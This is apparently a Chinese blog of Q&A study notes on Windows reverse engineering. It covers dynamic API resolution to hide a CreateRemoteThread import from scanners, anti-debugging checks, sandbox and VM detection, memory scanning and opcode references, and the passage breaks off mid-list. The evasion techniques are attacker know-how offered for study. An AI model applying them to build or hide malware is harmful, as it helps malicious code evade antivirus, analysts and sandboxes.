<h3 id="如何不在编码时直接导入相关-API-的前提下进行攻击"><a href="#如何不在编码时直接导入相关-API-的前提下进行攻击" class="headerlink" title="如何不在编码时直接导入相关 API 的前提下进行攻击"></a>如何不在编码时直接导入相关 API 的前提下进行攻击</h3><p>从攻击者的角度来看，<strong>不在编码时直接导入相关 API</strong> 是一个核心的规避手段。这种技术通常被称为<strong>动态 API 调用</strong>或<strong>运行时 API 解析</strong>，其主要目的是：</p>
<ol>
<li><strong>绕过签名检测：</strong> 传统的杀毒软件和安全工具会扫描可执行文件中的<strong>导入表</strong>。如果导入表里有 <code>CreateRemoteThread</code>、<code>WriteProcessMemory</code>、<code>LoadLibrary</code> 等高危函数，文件就会被标记为可疑。动态调用 API 可以让导入表看起来非常“干净”，从而躲过静态扫描</li>
<li><strong>增加逆向分析难度：</strong> 逆向工程师通常会从导入表入手，快速了解程序的功能。如果导入表是空的或只导入了少数几个基础函数，逆向分析师就必须花费大量时间去跟踪程序的运行时行为，才能发现其真正意图</li>
<li><strong>支持多操作系统版本和架构：</strong> 有些 API 的地址在不同版本的 Windows 上可能会有细微差异。动态获取 API 地址可以确保代码在不同系统上都能正确运行，提高攻击的通用性</li>
<li><strong>按需加载：</strong> 只有在需要执行特定恶意行为时才去获取和调用相应的 API，这可以减少不必要的代码和数据，使恶意程序更小、更精简</li>
</ol>
<p>下面是几种具体的技术实现，从初级到高级：</p>
<p><strong>1. 使用 <code>LoadLibrary</code> 和 <code>GetProcAddress</code></strong></p>
<p>这是最基础、最常见的方法。攻击者只需要在代码中静态导入 <code>LoadLibraryA/W</code> 和 <code>GetProcAddress</code> 这两个函数，然后用它们来动态获取所有其他需要的 API</p>
<p><strong>实现步骤：</strong></p>
<ol>
<li><strong>加载 DLL：</strong> 调用 <code>LoadLibraryA</code>，传入需要加载的 DLL 名称（例如 “kernel32.dll”）。这个函数会返回该 DLL 在内存中的基址</li>
<li><strong>获取函数地址：</strong> 调用 <code>GetProcAddress</code>，传入 DLL 的基址和需要获取的函数名称（例如 “CreateRemoteThread”）。这个函数会返回该 API 的内存地址</li>
<li><strong>函数指针调用：</strong> 将获取到的地址赋值给一个函数指针，然后通过这个指针像调用普通函数一样来调用它</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 伪代码</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HMODULE hKernel32 = LoadLibraryA(<span class="string">&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 处理错误</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个函数指针类型</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="title function_">HANDLE</span> <span class="params">(WINAPI* CreateRemoteThread_t)</span><span class="params">(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 CreateRemoteThread 的地址</span></span><br><span class="line">    CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t)GetProcAddress(hKernel32, <span class="string">&quot;CreateRemoteThread&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pCreateRemoteThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 处理错误</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在可以使用 pCreateRemoteThread 来调用 CreateRemoteThread 函数了</span></span><br><span class="line">    <span class="comment">// pCreateRemoteThread(..., ..., ...);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种方法虽然简单，但 <code>LoadLibrary</code> 和 <code>GetProcAddress</code> 依然会出现在程序的导入表中，因此安全软件仍然可以进行识别</p>
<p><strong>2. 手动解析 PEB</strong></p>
<p>这是更高级、更隐蔽的方法。其核心是<strong>完全不依赖任何静态导入</strong>，通过<strong>手动遍历内存中的数据结构</strong>来找到所需的 API 地址</p>
<p><strong>实现步骤：</strong></p>
<ol>
<li><strong>获取 PEB 地址：</strong> 在 32 位系统上，PEB 的地址可以通过 <code>FS:[0x30]</code> 寄存器来获取；在 64 位系统上，可以通过 <code>GS:[0x60]</code> 来获取</li>
<li><strong>遍历 PEB LDR 数据结构：</strong> PEB 结构体中包含一个指向已加载模块列表的指针（<code>LDR_DATA</code>）。攻击者可以遍历这个列表，找到 <code>ntdll.dll</code>、<code>kernel32.dll</code> 等已加载的 DLL 模块</li>
<li><strong>解析 DLL 的导出表（EAT）：</strong> 找到目标 DLL 的基址后，手动解析其<strong>导出地址表 (EAT)</strong>。EAT 是一个包含所有导出函数名称和地址的结构</li>
<li><strong>哈希值匹配：</strong> 为了避免在代码中硬编码函数名称字符串（字符串会暴露恶意意图），攻击者通常会为每个函数名称计算一个哈希值。遍历 EAT 中的函数名称，计算哈希值，然后与预设的目标哈希值进行匹配。如果匹配成功，就找到了所需 API 的地址</li>
<li><strong>函数指针调用：</strong> 获取到地址后，同样通过函数指针进行调用</li>
</ol>
<hr>
<h3 id="Windows-下有哪些常用的反调试技术"><a href="#Windows-下有哪些常用的反调试技术" class="headerlink" title="Windows 下有哪些常用的反调试技术"></a>Windows 下有哪些常用的反调试技术</h3><p><strong>1. 基于 Windows API 的反调试</strong></p>
<p>这是最常见、最容易实现的反调试技术，利用 Windows 系统提供的特定函数来查询进程状态</p>
<ul>
<li><strong><code>IsDebuggerPresent</code>：</strong> 这是最直接、最经典的 API。它位于 <code>kernel32.dll</code> 中，会检查 <strong>进程环境块 (PEB)</strong> 中的 <code>IsDebugged</code> 标志位。如果该位被设置为 <code>1</code>，函数就返回 <code>TRUE</code>。攻击者只需要简单地调用这个函数，然后根据返回值决定是否执行恶意代码</li>
<li><strong><code>CheckRemoteDebuggerPresent</code>：</strong> 这个 API 用来检查<strong>另一个进程</strong>是否正在被调试。它通常用于一个父进程检查其子进程是否被调试。攻击者可以启动一个子进程，然后父进程不断调用此 API 来监视子进程的状态</li>
<li><strong><code>OutputDebugString</code>：</strong> 这个函数原本用于向调试器输出调试信息。如果程序在没有调试器附加的情况下调用此函数，并随后调用 <code>GetLastError</code>，返回的错误码通常是 <code>ERROR_NOT_ENOUGH_MEMORY</code>（<code>0x08</code>）。如果返回其他值，则很可能存在调试器</li>
<li><strong><code>NtQueryInformationProcess</code>：</strong> 这是一个更底层的、功能强大的未公开（undocumented）API。通过查询 <code>ProcessDebugPort</code>、<code>ProcessDebugObject</code> 或 <code>ProcessDebugFlags</code> 等信息，可以精确地判断程序是否被调试。这是许多高级反调试技术的基石，因为不像 <code>IsDebuggerPresent</code>，它更难被简单地 Hook 或篡改</li>
</ul>
<p><strong>2. 基于异常和 SEH（结构化异常处理） 的反调试</strong></p>
<p>调试器在处理异常时与正常程序有不同的行为，这为反调试提供了可乘之机</p>
<ul>
<li><strong><code>INT 3</code> 断点：</strong> 调试器通常通过 <code>INT 3</code> (opcode <code>0xCC</code>) 指令来设置软件断点。攻击者可以在代码中故意插入一个 <code>INT 3</code> 指令，并设置自己的异常处理器。如果程序在执行 <code>INT 3</code> 后进入了预设的异常处理器，说明没有调试器存在（因为调试器会捕获 <code>INT 3</code> 并暂停程序）。如果程序没有进入异常处理器，就说明有调试器存在</li>
<li><strong><code>Trap Flag (TF)</code> 检测：</strong> 当调试器设置了硬件断点或启用单步执行时，CPU 的 EFLAGS 寄存器中的 <code>Trap Flag</code> 会被设置。攻击者可以通过内联汇编代码来检查这个标志位，判断是否正在进行单步调试</li>
<li><strong>利用 <code>VEH</code>（向量化异常处理）：</strong> <code>VEH</code> 是比 <code>SEH</code> 更早被调用的异常处理机制。攻击者可以在 <code>VEH</code> 中设置反调试逻辑，因为它更难被调试器忽略或绕过</li>
</ul>
<p><strong>3. 基于时间差和指令计数的反调试</strong></p>
<p>调试器在执行单步调试或设置断点时，会引入额外的延迟。正常程序可以利用这个时间差来检测调试器的存在</p>
<ul>
<li><strong><code>RDTSC</code> (Read Time-Stamp Counter)：</strong> 这是一个 CPU 指令，用于读取 CPU 的时间戳计数器。攻击者可以在代码中的两个点调用 <code>RDTSC</code>，并计算两次调用之间的时间差。如果这个时间差异常地长，很可能是因为调试器在单步执行或处理断点</li>
<li><strong><code>QueryPerformanceCounter</code>：</strong> 这是一个高精度的 Windows API。与 <code>RDTSC</code> 类似，攻击者可以调用两次这个 API 并计算时间差。如果时间差超过一个阈值，则认为存在调试器</li>
<li><strong>线程休眠检测：</strong> 当程序进入休眠状态时，调试器通常会唤醒它以便继续执行。攻击者可以调用 <code>Sleep()</code> 函数，然后检查实际休眠的时间是否与期望的时间相符。如果实际休眠时间比期望的短，说明调试器可能干预了线程的运行</li>
</ul>
<p><strong>4. 基于进程和线程状态的反调试</strong></p>
<p>调试器通常会改变被调试进程或线程的某些状态</p>
<ul>
<li><strong>父进程检测：</strong> 正常程序通常由 <code>explorer.exe</code> 或 <code>cmd.exe</code> 等合法进程启动。而调试器会成为被调试进程的父进程。攻击者可以调用 <code>NtQueryInformationProcess</code> 或 <code>CreateToolhelp32Snapshot</code> 等 API，检查父进程 ID (<code>PPID</code>) 是否是已知的调试器进程 ID，或者干脆检查 <code>PPID</code> 是否不等于 <code>explorer.exe</code> 的 <code>PPID</code></li>
<li><strong>线程上下文检测：</strong> 调试器会修改被调试线程的寄存器和线程上下文。攻击者可以检查 <code>TEB</code> (Thread Environment Block) 中与调试相关的字段，或者检查线程的上下文信息是否被篡改</li>
</ul>
<p><strong>5. 其他高级反调试技术</strong></p>
<ul>
<li><strong>调试器检测点：</strong> 在代码中故意创建多个 <code>INT 3</code> 断点或 <code>CALL</code> 调试 API 的分支，但让程序在没有调试器的情况下跳过这些分支。当调试器附加时，这些分支被执行，从而暴露调试器的存在</li>
<li><strong>自修改代码：</strong> 在程序运行时修改自己的代码，例如用 <code>NOP</code> 指令覆盖反调试代码，或用 <code>jmp</code> 指令跳转到真正的逻辑代码。调试器很难追踪和分析这种行为，因为其静态分析视图与运行时视图不符</li>
<li><strong>反汇编器检测：</strong> 有些技术不仅针对调试器，还针对 IDA Pro 等反汇编工具。例如，在代码中插入一些特殊指令序列，这些序列在 CPU 上执行正常，但在反汇编器中会被错误地解析，导致代码流被混淆</li>
</ul>
<hr>
<h3 id="单步执行的原理是什么"><a href="#单步执行的原理是什么" class="headerlink" title="单步执行的原理是什么"></a>单步执行的原理是什么</h3><p><strong>1. 陷阱标志</strong></p>
<p>在 x86 架构的 CPU 中，有一个特殊的寄存器叫做 <strong>EFLAGS</strong>（在 64 位系统中是 RFLAGS）。这个寄存器中的每一位都代表一个特定的状态或控制标志。其中的第 8 位就是<strong>陷阱标志（TF）</strong></p>
<ul>
<li><strong>当 TF&#x3D;0 时</strong>：CPU 正常执行指令，不会触发单步中断</li>
<li><strong>当 TF&#x3D;1 时</strong>：这是单步执行的关键。CPU 在执行完一条指令后，会自动产生一个 <strong>INT 1</strong> 异常（也就是<strong>单步中断</strong>）</li>
</ul>
<p><strong>2. 单步执行的原理流程</strong></p>
<p>当你在调试器中点击“单步”按钮时，幕后会发生以下几个步骤：</p>
<ol>
<li><strong>调试器设置 TF 标志位：</strong> 调试器通过系统调用或直接操作，将 <strong>EFLAGS 寄存器中的 TF 位设置为 1</strong></li>
<li><strong>CPU 执行下一条指令：</strong> CPU 继续正常执行程序代码中的下一条指令</li>
<li><strong>CPU 产生 INT 1 异常：</strong> 在这条指令执行完毕后，CPU 检查到 TF 标志位为 1，于是自动停止正常的程序执行流程，并产生一个 <strong>INT 1 异常</strong></li>
<li><strong>操作系统捕获异常：</strong> 操作系统有一个专门的<strong>中断描述符表（IDT）</strong>。当 INT 1 异常发生时，操作系统会根据 IDT 中预先设置好的入口点，将控制权交给处理 INT 1 异常的程序</li>
<li><strong>调试器接管控制权：</strong> 由于调试器是操作系统中管理被调试进程的组件，它会事先向操作系统注册一个异常处理函数。因此，当 INT 1 异常发生时，<strong>控制权实际上被交给了调试器</strong></li>
<li><strong>调试器暂停程序：</strong> 调试器在接管控制权后，会暂停被调试程序的执行，并显示当前的程序状态（寄存器值、内存数据等）</li>
<li><strong>等待用户操作：</strong> 此时，程序在调试器中处于暂停状态，等待你进行下一步操作，比如再次单步、查看变量或继续运行</li>
</ol>
<p>如果你再次点击“单步”，这个循环会重新开始：调试器再次设置 TF，程序执行一条指令，然后控制权再次回到调试器</p>
<p><strong>3. 特殊情况：<code>INT 3</code> 断点</strong></p>
<p>除了利用 TF 标志位，调试器还有一个常用的单步执行辅助手段，那就是**<code>INT 3</code> 指令**</p>
<ul>
<li>当你在某行代码上设置了一个断点（Breakpoint）时，调试器会偷偷地将该行代码的第一个字节替换成 <strong><code>0xCC</code></strong></li>
<li><code>0xCC</code> 对应的汇编指令就是 <strong><code>INT 3</code></strong></li>
<li>当程序执行到这个位置时，CPU会像处理单步中断一样，产生一个 <strong>INT 3 异常</strong></li>
<li>操作系统将控制权交给调试器，程序暂停，从而实现了“断点”的功能</li>
</ul>
<p>所以，当调试器在一个断点处暂停后，你点击单步，调试器会先<strong>将 <code>0xCC</code> 恢复为原来的指令</strong>，然后<strong>设置 TF 标志位</strong>，让程序执行那条被恢复的指令，最后在指令执行完毕后，再次设置 <code>0xCC</code>，等待下一次的断点触发</p>
<hr>
<h3 id="在内存中已-Load-的程序如何快速找到其具有执行权限的段"><a href="#在内存中已-Load-的程序如何快速找到其具有执行权限的段" class="headerlink" title="在内存中已 Load 的程序如何快速找到其具有执行权限的段"></a>在内存中已 Load 的程序如何快速找到其具有执行权限的段</h3><p><strong>方法一：利用操作系统 API</strong></p>
<p>这是最常用、最稳定的方法。Windows 提供了强大的内存查询 API，可以快速遍历和检查一个进程的内存空间</p>
<ol>
<li><strong><code>VirtualQueryEx</code> 函数：</strong> 这是最核心的 API。通过循环调用 <code>VirtualQueryEx</code>，你可以遍历整个进程的虚拟地址空间。这个函数会填充一个 <code>MEMORY_BASIC_INFORMATION</code> 结构体，其中包含了每个内存页面的信息，例如：<ul>
<li><code>BaseAddress</code>：内存区域的起始地址</li>
<li><code>RegionSize</code>：内存区域的大小</li>
<li><code>State</code>：内存区域的状态（如已提交 <code>MEM_COMMIT</code>）</li>
<li><code>Protect</code>：最重要的字段，描述内存区域的保护权限</li>
</ul>
</li>
<li><strong>检查 <code>Protect</code> 字段：</strong> <code>Protect</code> 字段是一个位掩码，你需要检查它是否包含代表<strong>可执行</strong>的标志。常见的可执行权限标志有：<ul>
<li><code>PAGE_EXECUTE</code></li>
<li><code>PAGE_EXECUTE_READ</code></li>
<li><code>PAGE_EXECUTE_READWRITE</code></li>
<li><code>PAGE_EXECUTE_WRITECOPY</code></li>
</ul>
</li>
</ol>
<p><strong>示例代码（伪C++）：</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">FindExecutableRegions</span><span class="params">(HANDLE hProcess)</span> </span>&#123;</span><br><span class="line">    MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line">    LPVOID pBaseAddress = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">VirtualQueryEx</span>(hProcess, pBaseAddress, &amp;mbi, <span class="built_in">sizeof</span>(mbi)) == <span class="built_in">sizeof</span>(mbi)) &#123;</span><br><span class="line">        <span class="comment">// 检查内存状态，确保它已提交并有可执行权限</span></span><br><span class="line">        <span class="keyword">if</span> (mbi.State == MEM_COMMIT &amp;&amp; </span><br><span class="line">            (mbi.Protect &amp; (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 找到了一个可执行的区域</span></span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;Executable region found at: &quot;</span> &lt;&lt; std::hex &lt;&lt; mbi.BaseAddress </span><br><span class="line">                      &lt;&lt; <span class="string">&quot;, Size: &quot;</span> &lt;&lt; mbi.RegionSize &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 移动到下一个内存区域</span></span><br><span class="line">        pBaseAddress = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 假设你已经获取了目标进程的句柄</span></span><br><span class="line">    <span class="comment">// HANDLE hTargetProcess = OpenProcess(...);</span></span><br><span class="line">    <span class="comment">// FindExecutableRegions(hTargetProcess);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>方法二：利用 PEB（进程环境块）和 PE 结构</strong></p>
<p>对于已加载的 <strong>PE 文件</strong>，你可以直接解析其在内存中的结构来找到可执行段。这通常比遍历所有内存区域更快，但只适用于目标是主模块或已知的 DLL</p>
<ol>
<li><strong>定位 PEB：</strong><ul>
<li>32 位：通过 <code>FS:[0x30]</code> 寄存器获取</li>
<li>64 位：通过 <code>GS:[0x60]</code> 寄存器获取</li>
</ul>
</li>
<li><strong>获取 ImageBase：</strong> 从 PEB 中找到 <code>ImageBase</code> 字段，它存储了主模块在内存中的基址</li>
<li><strong>解析 PE 头部：</strong><ul>
<li>从 <code>ImageBase</code> 开始，找到 <code>e_lfanew</code> 字段，它指向 <strong>NT 头部（NT Header）</strong></li>
<li>在 NT 头部中，找到<strong>可选头部（Optional Header）</strong></li>
<li>在可选头部中，找到**节表（Section Table）**的偏移</li>
</ul>
</li>
<li><strong>遍历节表：</strong><ul>
<li>节表是一个 <code>IMAGE_SECTION_HEADER</code> 结构体数组</li>
<li>遍历这个数组，检查每个节的**特征（Characteristics）**字段</li>
<li>寻找 <code>IMAGE_SCN_MEM_EXECUTE</code> 标志。如果这个标志被设置，那么这个节就是可执行的</li>
</ul>
</li>
<li><strong>计算地址：</strong> 找到可执行的节后，其在内存中的实际地址是 <code>ImageBase + VirtualAddress</code></li>
</ol>
<p><strong>方法三：利用调试器或反汇编器</strong></p>
<p>如果你在使用调试器（如 x64dbg 或 IDA Pro）或反汇编器（如 Ghidra），这个过程会变得非常直观</p>
<ul>
<li><strong>x64dbg：</strong><ul>
<li>打开内存视图（Memory Map），通常是快捷键 <code>Alt+M</code></li>
<li>在这里，你会看到所有已加载的模块和内存区域的列表</li>
<li>列表会清楚地显示每个区域的权限（<code>R</code>、<code>W</code>、<code>X</code>），你可以直接找到所有带有 <code>X</code> 标志的区域</li>
</ul>
</li>
<li><strong>IDA Pro &#x2F; Ghidra：</strong><ul>
<li>这些工具会自动解析 PE 文件并显示其所有节</li>
<li>你可以进入“段”（Segments）或“内存区域”（Memory Regions）视图</li>
<li>视图中会明确标记每个段的权限，通常<code>.text</code> 段会显示为 <code>EXECUTE</code> 权限</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>方法</th>
<th>优点</th>
<th>缺点</th>
<th>适用场景</th>
</tr>
</thead>
<tbody><tr>
<td>API调用</td>
<td>最通用、最稳定。能找到所有可执行内存区域，包括非PE结构（如JIT编译的代码）</td>
<td>需要编写代码。性能相对较低，需要遍历整个虚拟内存空间</td>
<td>动态分析、恶意软件分析、注入器等</td>
</tr>
<tr>
<td>PE结构解析</td>
<td>速度快，精确。能快速定位.text段和其它可执行的PE节</td>
<td>只能用于已加载的PE文件。如果程序有自解压或自修改行为，可能会失效</td>
<td>静态分析，当你知道目标是合法的PE文件时</td>
</tr>
<tr>
<td>调试器&#x2F;反汇编器</td>
<td>最直观、最简单。提供可视化的界面，无需编写代码</td>
<td>依赖于外部工具。无法自动化（除非通过脚本）</td>
<td>交互式调试、快速逆向工程</td>
</tr>
</tbody></table>
<hr>
<h3 id="恶意软件有哪些方案检测自己处于沙箱中"><a href="#恶意软件有哪些方案检测自己处于沙箱中" class="headerlink" title="恶意软件有哪些方案检测自己处于沙箱中"></a>恶意软件有哪些方案检测自己处于沙箱中</h3><p><strong>1. 基于环境特征的检测</strong></p>
<p>沙箱为了快速分析大量样本，通常会使用标准化的、不完整的系统配置。恶意软件可以利用这些不寻常的特征来判断自己是否被分析</p>
<ul>
<li><strong>硬件特征</strong>：<ul>
<li><strong>CPU 指令</strong>：通过 <code>cpuid</code> 指令查询 CPU 供应商字符串。虚拟机通常会返回 <code>VMwareVMware</code>, <code>KVMKVMKVM</code> 或 <code>Microsoft Hv</code> 等特殊字符串，而真实的物理机则会返回 <code>GenuineIntel</code> 或 <code>AuthenticAMD</code></li>
<li><strong>MAC 地址</strong>：检查网卡（MAC）地址。某些虚拟化厂商的 MAC 地址范围是公开的，例如 VMware 的 MAC 地址通常以 <code>00-50-56</code> 开头</li>
<li><strong>内存大小</strong>：沙箱为了节省资源，通常会分配较少的内存（例如 1GB 或 2GB）。恶意软件可以查询系统内存大小，如果远低于正常桌面系统的配置，就可能怀疑自己处于沙箱中</li>
</ul>
</li>
<li><strong>文件系统和注册表</strong>：<ul>
<li><strong>特定文件</strong>：检查是否存在某些虚拟化工具或分析工具的特定文件，例如 <code>C:\windows\System32\Drivers\VBoxGuest.sys</code> (VirtualBox) 或 <code>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</code> (VMware Tools)</li>
<li><strong>注册表项</strong>：查询与虚拟化相关的注册表键值，例如 <code>HKEY_LOCAL_MACHINE\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier</code>，其值可能会包含 <code>VBOX</code> 或 <code>VMware</code> 等字符串</li>
</ul>
</li>
</ul>
<p><strong>2. 基于行为和用户交互的检测</strong></p>
<p>正常的桌面环境会有频繁的用户活动，而沙箱通常是自动化运行的，缺乏这些活动</p>
<ul>
<li><strong>用户活动检测</strong>：<ul>
<li><strong>鼠标移动</strong>：检查鼠标自启动以来的移动距离。如果鼠标几乎没有移动，可能表明没有真实用户在操作</li>
<li><strong>窗口数量</strong>：查询桌面上的窗口数量。沙箱通常只运行一个应用程序，所以窗口数量可能很少</li>
<li><strong>键盘输入</strong>：监控键盘输入事件。如果长时间没有按键操作，也可能是沙箱</li>
<li><strong>屏幕分辨率</strong>：沙箱环境通常使用一个固定的、非标准的分辨率</li>
</ul>
</li>
<li><strong>执行时间检测</strong>：<ul>
<li><strong>延迟执行</strong>：恶意软件会在运行初期休眠一段较长的时间（例如几分钟或几小时）。沙箱通常只运行几十秒到几分钟，无法捕捉到后续的恶意行为</li>
<li><strong>时间戳</strong>：检查系统启动时间，或使用 <code>Sleep</code> 函数，然后比较前后两次获取系统时间的时间差。如果时间差比预期的短得多（因为沙箱可能通过加快时钟来加速分析），就表明处于虚拟化环境</li>
</ul>
</li>
</ul>
<p><strong>3. 基于进程和文件分析工具的检测</strong></p>
<p>沙箱环境通常会运行一些监控工具，这些工具的进程或文件名可能暴露它的身份</p>
<ul>
<li><strong>进程列表</strong>：遍历运行中的进程列表，查找常见的分析工具进程名，例如：<ul>
<li><code>procmon.exe</code> (Process Monitor)</li>
<li><code>wireshark.exe</code> (Wireshark)</li>
<li><code>Fiddler.exe</code></li>
<li><code>idaq64.exe</code> (IDA Pro)</li>
</ul>
</li>
<li><strong>文件名</strong>：恶意软件可以检查自身的可执行文件名。一些自动化分析系统会把样本重命名为固定的、可预测的名字，例如 <code>sample.exe</code> 或 <code>malware.exe</code></li>
</ul>
<p><strong>4. 基于硬件和底层代码的检测</strong></p>
<p>这是更高级的反沙箱技术，直接利用虚拟机和物理机底层实现的差异</p>
<ul>
<li><strong>指令时序分析</strong>：某些 CPU 指令在虚拟机中执行所需的时间与在物理机上不同。恶意软件可以执行这些特定指令，然后测量其执行时间，通过比较时间差来判断</li>
<li><strong>中断描述符表（IDT）检测</strong>：虚拟机管理程序（Hypervisor）通常会修改 IDT 以拦截某些特权指令。恶意软件可以检查 IDT 的地址或内容，寻找被篡改的迹象</li>
<li><strong>内存布局</strong>：检查内存布局，如某些特殊的地址或结构，它们在虚拟机中可能会有独特的模式</li>
</ul>
<hr>
<h3 id="做一个反汇编器，指令集-opcode-的意义去哪查"><a href="#做一个反汇编器，指令集-opcode-的意义去哪查" class="headerlink" title="做一个反汇编器，指令集 opcode 的意义去哪查"></a>做一个反汇编器，指令集 opcode 的意义去哪查</h3><p><strong>主流 CPU 架构的指令集手册</strong></p>
<p>根据你要反汇编的 CPU 架构，你需要查阅不同的手册：</p>
<p><strong>1. x86 &#x2F; x64 架构 (Intel &#x2F; AMD)</strong></p>
<p>这是最常见的桌面和服务器架构，也是大多数恶意软件和 Windows&#x2F;Linux 程序所使用的架构</p>
<ul>
<li><strong>Intel 64 和 IA-32 架构软件开发人员手册</strong>: 这是 x86 &#x2F; x64 架构的黄金标准。它包含好几卷，其中：<ul>
<li><strong>卷 2A、2B 和 2C</strong>：详细描述了每条指令的 <strong>操作码（Opcode）</strong>、<strong>汇编助记符（Mnemonic）</strong>、<strong>操作数（Operands）</strong>、以及指令功能</li>
</ul>
</li>
<li><strong>AMD 64 架构程序员参考手册</strong>: 如果你需要支持 AMD 的处理器，这套手册是必不可少的。它与 Intel 的手册内容高度兼容，但也有一些 AMD 特有的指令</li>
</ul>
<p><strong>2. ARM 架构</strong></p>
<p>ARM 架构主导着移动设备（手机、平板）和嵌入式系统，现在也越来越多地用于服务器和桌面</p>
<ul>
<li><strong>ARM 架构参考手册</strong>: 这是 ARM 架构的官方文档。它详细介绍了 ARM 和 Thumb 指令集，以及各种架构特性，如 AArch64、AArch32 等</li>
</ul>
<p><strong>3. MIPS 架构</strong></p>
<p>MIPS 在早期的嵌入式设备、路由器和游戏机（如 PS2）中非常流行</p>
<ul>
<li><strong>MIPS32&#x2F;MIPS64 架构参考手册</strong>：这是 MIPS 架构的官方手册，提供了所有指令的详细信息</li>
</ul>
<hr>
<h3 id="怎么识别指令跳转条件和内存访问"><a href="#怎么识别指令跳转条件和内存访问" class="headerlink" title="怎么识别指令跳转条件和内存访问"></a>怎么识别指令跳转条件和内存访问</h3><p><strong>如何识别指令跳转条件</strong></p>
<p>在汇编语言中，跳转指令分为<strong>无条件跳转</strong>和<strong>有条件跳转</strong></p>
<p><strong>1. 无条件跳转</strong></p>
<p>这是最简单的一种。它们总是会改变程序的执行流程</p>
<ul>
<li><strong>指令</strong>：<code>jmp</code> (Jump)</li>
<li><strong>识别方法</strong>：在反汇编代码中，<code>jmp</code> 指令后面通常跟着一个目标地址。它像一个程序里的 <code>goto</code> 语句，直接将控制权转移到另一个位置，没有其他条件</li>
</ul>
<p><strong>2. 有条件跳转</strong></p>
<p>这些跳转指令依赖于 CPU 的**标志寄存器（Flags Register）**的状态。标志寄存器中的位（如零标志、符号标志、进位标志等）在执行算术或比较指令后会被设置</p>
<ul>
<li><strong>指令</strong>：有条件跳转指令通常以字母 <code>j</code> 开头，后面跟着一个或两个字母来表示其条件<ul>
<li><code>je</code> (Jump if Equal)：如果零标志（ZF）为1，则跳转。通常跟在 <code>cmp</code> 或 <code>test</code> 指令之后，用于判断两个值是否相等</li>
<li><code>jne</code> (Jump if Not Equal)：如果零标志（ZF）为0，则跳转</li>
<li><code>jg</code> (Jump if Greater)：如果大于则跳转（有符号）</li>
<li><code>jl</code> (Jump if Less)：如果小于则跳转（有符号）</li>
<li><code>ja</code> (Jump if Above)：如果大于则跳转（无符号）</li>
<li><code>jb</code> (Jump if Below)：如果小于则跳转（无符号）</li>
</ul>
</li>
